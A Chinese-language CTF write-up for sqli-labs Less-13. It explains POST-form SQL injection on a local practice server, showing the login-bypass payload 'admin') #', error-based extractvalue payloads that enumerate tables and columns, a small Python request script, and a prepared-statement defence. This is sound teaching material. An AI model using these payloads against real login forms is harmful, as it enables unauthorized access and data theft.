---
layout: post
title: sqli-labs - Less-13 POST 双注入（单引号+括号）Writeup
platform: sqli-labs
date: 2026-11-10 08:30:00 +0800
categories: CTF
---

sqli-labs - Less-13 POST 双注入（单引号+括号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-13 → POST - Double Injection - String with twist（登录框 + 单引号 + 括号）
- 地址：`http://127.0.0.1:8080/Less-13/`
- 题型：Web / SQL 注入
- 考点：**POST 登录框：单引号 + 括号闭合 → 万能密码 / 报错注入**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
uname=1&passwd=1                         → 页面显示 slap.jpg（失败）
uname=admin') #                          → 页面显示 flag.jpg（登录成功）
uname=1') and extractvalue(1,concat(0x7e,database())) #
                                         → XPATH syntax error: '~security'
```

二、题目分析

**① 源码**

```php
$uname = $_POST['uname'];
$passwd = $_POST['passwd'];
@$sql = "SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);

if ($row) { echo '<img src="../images/flag.jpg" />'; }   // 成功
else      { echo '<img src="../images/slap.jpg" />'; }   // 失败
```

**② 三个关键点**

```text
① POST 提交（参数在请求体里）
② 单引号 ' + 括号 ()   →  闭合要写 ')
③ 页面不回显数据，只显示一张图：
      flag.jpg = 登录成功
      slap.jpg = 失败
   ★ 图片就是"布尔信号"
```

**③ 两种打法**

| 打法 | payload | 原理 |
|---|---|---|
| 万能密码 | `admin') #` | 注释掉密码判断 |
| 报错注入 | `1') and extractvalue(...) #` | 错误信息里带出数据 |

三、解题步骤

**第一步：抓包确认参数**

```text
F12 → 网络 → 提交表单 → 看请求体：
  uname=1&passwd=1&submit=Submit
```

**第二步：试闭合（看图片变化）**

```text
uname=admin' #     → slap.jpg（还不对，少括号）
uname=admin') #    → flag.jpg  ★ 对了
```

**第三步：万能密码登录**

```text
uname = admin') #
passwd = 任意

拼接后：
  SELECT ... WHERE username=('admin') #') and password=('任意') LIMIT 0,1
                                    ↑ 后面全被注释
→ 只要 admin 存在就登录成功 → flag.jpg
```

**第四步：报错注入拿数据**

```text
uname = 1') and extractvalue(1,concat(0x7e,database())) #
→ XPATH syntax error: '~security'

uname = 1') and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #
→ '~emails,referers,uagents,users'

uname = 1') and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))) #
→ '~id,username,password'
```

**第五步：脚本**

```python
import requests

url = "http://127.0.0.1:8080/Less-13/"

def login(uname, passwd="x"):
    r = requests.post(url, data={"uname": uname, "passwd": passwd, "submit": "Submit"}, timeout=10)
    return "flag.jpg" if "flag.jpg" in r.text else "slap.jpg"

print(login("admin') #"))                                    # flag.jpg
print(login("1') and extractvalue(1,concat(0x7e,database())) #"))
```

四、延伸知识

**① 图片也能当布尔信号**

```text
页面没有文字回显时，任何"会变的东西"都能当信号：
  图片名、HTTP 状态码、响应长度、重定向、Cookie 变化……
★ 只要"真"和"假"能区分，就能盲注
```

**② 三种闭合的组合**

```
'     单引号
')    单引号 + 括号
"     双引号
")    双引号 + 括号
★ 报错信息里的引号/括号残留，就是答案
```

**③ 防御**

```php
$stmt = $pdo->prepare("SELECT username FROM users WHERE username=? AND password=?");
$stmt->execute([$uname, $passwd]);
```

五、总结

- **本题核心：POST 登录框 + `('$uname')` 闭合 → `admin') #` 万能密码；数据用报错注入带出。**

- 三步方法论：

```text
① 抓包看参数（uname / passwd / submit）
② 报错反推闭合：' 还是 ') 
③ 万能密码 / extractvalue 报错注入
```

- **三个必记要点**：

```text
① 页面只显示图片 → flag.jpg 是成功、slap.jpg 是失败，图片名就是布尔信号
② POST 注释用 #，别用 --+
③ 报错注入一次带 32 字节，长数据要分段
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-13：POST + ('$uname') → 闭合写 ')                       │
│                                                              │
│  万能密码：admin') #                                          │
│  报错注入：1') and extractvalue(1,concat(0x7e,database())) #  │
│                                                              │
│  ★ flag.jpg = 成功   slap.jpg = 失败（图片即信号）            │
└──────────────────────────────────────────────────────────────┘
```
